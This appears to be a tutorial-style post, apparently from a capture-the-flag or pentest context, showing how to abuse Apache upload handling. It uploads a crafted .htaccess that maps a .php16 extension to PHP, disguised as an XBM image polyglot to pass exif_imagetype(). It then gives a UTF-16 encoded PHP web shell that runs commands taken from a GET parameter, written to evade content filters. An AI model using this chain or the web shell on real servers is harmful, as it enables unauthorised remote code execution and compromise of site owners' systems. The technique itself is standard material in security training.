In some Apache server an attacker can manipulate the files that can upload abusing of the **.htaccess** configuration file.

**".htaccess files provide a way to make configuration changes on a per-directory basis."**

Pretty clear. Thanks google ! So it’s a configuration file. Now look at this conf:
```
AddType application/x-httpd-php .php16      # Say all file with extension .php16 will execute php
php_value zend.multibyte 1                  # Active specific encoding (you will see why after :D)
php_value zend.detect_unicode 1             # Detect if the file have unicode content
php_value display_errors 1                  # Display php errors
```

So if you can upload this .htaccess file we will be the king and we will can execute our php code.

Tipically to upload thi file you need to modify the HTTP upload request as follow:
- Modify the content type to **text/plain**;
- Modify the filename parameter to **.htaccess**.

In case our .htaccess upload is rejected you can use **polyglot file**.

What is polyglot file ?
“In computing, a polyglot is a computer program or script written in a valid form of multiple programming languages, which performs the same operations or output independent of the programming language used to compile or interpret it.”

The first trick here is to find a way to bypass image checker. How would it be possible to send our .htaccess to pass through **exif_imagetype()** protection. The first think is to read the php doc to understand the function: http://php.net/manual/en/function.exif-imagetype.php.

Go to the bottom on the page and you will see all file authorized by the function. The goal is to found a format pretty clear to avoid garbage in our .htaccess. I think a XBM (X Bit Map) file will do the trick.

“In computer graphics, the X Window System used X BitMap (XBM), a plain text binary image format, for storing cursor and icon bitmaps used in the X GUI.”

And there is an example:
```
#define test_width 16
#define test_height 7
static char test_bits[] = {
0x13, 0x00, 0x15, 0x00, 0x93, 0xcd, 0x55, 0xa5, 0x93, 0xc5, 0x00, 0x80,
0x00, 0x60 };
```

**The format of xbitmap is pretty clear : you set the image size on the first line of the file. And we’ve got a # in front of the line ! So our .htaccess will not be disturbed by the xbitmap header. And with this trick we bypass size and image filter. Let’s try this**.

This is our new .htaccess file:
```
#define width 1337                          # Define the width wanted by the code (and say we are a legit xbitmap file lol)
#define height 1337                         # Define the height

AddType application/x-httpd-php .php16      # Say all file with extension .php16 will execute php

php_value zend.multibyte 1                  # Active specific encoding (you will see why after :D)
php_value zend.detect_unicode 1             # Detect if the file have unicode content
php_value display_errors 1                  # Display php errors
```

### Bypass eventually filter that analyze the code of the file uploaded

But how can I upload php to bypass the filter on the code. The answer is simple : encode your payload.
Explanation. PHP support several form of encoding. Currently, you are writing in utf-8, but php also support utf-16 encoding. There is the same payload but encoded in utf-8 and after in utf-16.

In utf-8, a character is encoded on 1 byte:
```
00000000: 3c3f 7068 7020 7379 7374 656d 2824 5f47  <?php system($_G
00000010: 4554 5b27 636d 6427 5d29 3b20 6469 6528  ET['cmd']); die(
00000020: 293b 203f 3e0a                           ); ?>.
```

But in utf-16, the character is encoded on 2 bytes:
```
00000000: 003c 003f 0070 0068 0070 0020 0073 0079  .<.?.p.h.p. .s.y
00000010: 0073 0074 0065 006d 0028 0024 005f 0047  .s.t.e.m.(.$._.G
00000020: 0045 0054 005b 0027 0063 006d 0064 0027  .E.T.[.'.c.m.d.'
00000030: 005d 0029 003b 0020 0064 0069 0065 0028  .].).;. .d.i.e.(
00000040: 0029 003b 0020 003f 003e 0a              .).;. .?.>.
```
